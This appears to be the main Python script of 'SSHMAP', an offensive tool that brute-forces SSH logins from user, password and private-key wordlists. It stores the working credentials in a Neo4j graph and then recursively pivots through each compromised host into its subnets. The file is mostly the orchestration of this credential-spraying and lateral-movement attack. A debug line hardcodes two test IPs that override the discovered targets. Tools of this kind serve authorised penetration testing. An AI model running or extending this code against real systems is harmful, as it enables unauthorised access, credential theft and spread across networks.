import argparse
import asyncio
import os
from modules import bruteforce, graphdb, key_scanner
from modules.logger import sshmap_logger, setup_debug_logging
from modules.helpers.logger import highlight
from modules.config import CONFIG
from modules.utils import get_local_info, get_remote_info, read_targets, check_open_port, get_all_ips_in_subnet
from modules.credential_store import CredentialStore
from argparse import RawTextHelpFormatter
import signal

VERSION="0.1"

# Setup neo4j
graph = graphdb.GraphDB(CONFIG["neo4j_uri"], CONFIG["neo4j_user"], CONFIG["neo4j_pass"])

start_host, start_ips = get_local_info()
ssh_ports = CONFIG["ssh_ports"]
# Max depth for the ssh scan
max_depth = CONFIG["max_depth"]
# Thread-safe function to handle a target

visited_attempts = set()


async def handle_target(target, maxworkers, credential_store, current_depth, jump=None):
       
    if current_depth > max_depth:
        sshmap_logger.info(f"Max depth {max_depth} reached. Skipping {target}")
        return
    if current_depth == 1:
        source_host = start_host
    else:
        source_host = jump.get_remote_hostname()

    if jump is not None:
        sshmap_logger.info(f"New handle_target with target:{target} with jump {jump.get_host()} and current depth {current_depth} starting from {source_host}")
    else:
        sshmap_logger.info(f"New handle_target with target:{target} and current depth {current_depth} , starting from {source_host}")
    # Avoid retrying same target from same source
    if (source_host, target) in visited_attempts:
        sshmap_logger.display(f"Already attempted {target} from {source_host}. Skipping.")
        return
    else:
        sshmap_logger.info(f"Adding to visited_attempts {target} from {source_host}.")
        # Mark this attempt as visited
        visited_attempts.add((source_host, target))

    for port in ssh_ports:
        sshmap_logger.info(f"Scaning {target} port {port}.")
        # We can not check open ports if we are using a jump host, so we just try to connect to all ports
        if current_depth > 1 or check_open_port(target, port):
            sshmap_logger.info(f"[{target}] Port {port} is open, starting bruteforce...")
            results = await bruteforce.try_all(target, port, maxworkers, jump, credential_store)
            for res in results:
                if res.ssh_session:
                    #SSHSession object inside res
                    ssh_conn = res.get_ssh_connection()
                    # Add the target to the graph
                    # Get the remote hostname and IPs
                    sshmap_logger.info(f"[{target}:{port}] Get remote hostname and IPs")
                    remote_hostname, remote_ips = await get_remote_info(ssh_conn)
                    sshmap_logger.info(f"[{target}:{port}] Add target to database: {res.user}@{target} using {res.method}")
                    sshmap_logger.info(f"[{target}:{port}] Net info target: {remote_hostname} with IPs: {remote_ips}")
                    graph.add_host(remote_hostname, remote_ips)
                    sshmap_logger.info(f"[{target}:{port}] Add SSH connection {source_host}->{remote_hostname} with creds:{res.user}:{res.creds}")
                    graph.add_ssh_connection(from_hostname=source_host, to_hostname=remote_hostname, user=res.user, method=res.method, creds=res.creds, ip=target, port=port)
                    sshmap_logger.success(f"[{target}:{port}] Successfully added SSH connection from {source_host} to {remote_hostname} with user {res.user}")
                    #keys_found = key_scanner.find_keys(ssh_conn)
                    #logger.info(f"[{target}] Keys found: {keys_found}")
                    # Close the SSH connection
                    new_targets = []
                    for remote_ip_cidr in remote_ips:
                        new_targets.append(get_all_ips_in_subnet(remote_ip_cidr["ip"], remote_ip_cidr["mask"]))
                    # tests with 2 ips only
                    new_targets = ["172.19.0.3","172.19.0.2"]
                    sshmap_logger.display(f"We create a recursive now with remote_hostname {remote_hostname}, loaded {len(new_targets)} new targets")
                    for new_target in new_targets:
                        await handle_target(
                                new_target,
                                maxworkers,
                                credential_store,
                                current_depth + 1,
                                jump=ssh_conn,
                            )
                    await ssh_conn.close()

async def worker(target_queue, maxworkers, credential_store, current_depth):
    if current_depth > max_depth:
        sshmap_logger.display(f"Max depth {current_depth} reached. Skipping.")
        return
    while not target_queue.empty():
        target = await target_queue.get()
        try:
            await handle_target(target, maxworkers, credential_store, current_depth)
        finally:
            target_queue.task_done()


async def async_main(args):
    setup_debug_logging()
    credential_store = CredentialStore(args.credentialspath)
    targets = read_targets(args.targets)

    with open(args.users) as f:
        users = [line.strip() for line in f if line.strip()]
    with open(args.passwords) as f:
        passwords = [line.strip() for line in f if line.strip()]
    keyfiles = [os.path.join(args.keys, f) for f in os.listdir(args.keys)]

    for user in users:
        for password in passwords:
            credential_store.store("_bruteforce", 22, user, password, "password")
        for keyfile in keyfiles:
            credential_store.store("_bruteforce", 22, user, keyfile, "keyfile")

    sshmap_logger.display(f"Starting attack on {len(targets)} targets with max depth {max_depth}")
    graph.add_host(start_host, start_ips)

    # Launch multiple tasks concurrently for all targets
    tasks = [
        asyncio.create_task(handle_target(target, args.maxworkers, credential_store, 1))
        for target in targets
    ]

    await asyncio.gather(*tasks)

    graph.close()
    sshmap_logger.success("All tasks completed.")


def main():

    parser = argparse.ArgumentParser(
        description=rf"""
███████╗███████╗██╗  ██╗███╗   ███╗ █████╗ ██████╗ 
██╔════╝██╔════╝██║  ██║████╗ ████║██╔══██╗██╔══██╗
███████╗███████╗███████║██╔████╔██║███████║██████╔╝
╚════██║╚════██║██╔══██║██║╚██╔╝██║██╔══██║██╔═══╝ 
███████║███████║██║  ██║██║ ╚═╝ ██║██║  ██║██║     
╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
                                                
                                                         
        SSH Credential Mapper - SSHMAP           
        Navigating the Maze of Access...   

    {highlight('Version', 'red')} : {highlight(VERSION)}
    """, formatter_class=RawTextHelpFormatter,)    
    parser.add_argument("--targets", required=True, help="Path to the file with target IPs")
    parser.add_argument("--users", default="wordlists/users.txt", help="Path to the file with usernames for bruteforce")
    parser.add_argument("--passwords", default="wordlists/passwords.txt", help="Path to the file with passwords for bruteforce")
    parser.add_argument("--credentialspath", default="wordlists/credentials.csv", help="Path to CSV credentials file, will populate users and passwords")
    parser.add_argument("--keys", default="wordlists/keys/", help="Path to directory with SSH private keys")
    parser.add_argument("--maxworkers", type=int, default=10, help="Number of workers for target")
    parser.add_argument("--debug", action="store_true", help="enable debug level information")
    parser.add_argument("--verbose", action="store_true", help="enable verbose output")

    args = parser.parse_args()
    asyncio.run(async_main(args))
    

if __name__ == "__main__":
    main()
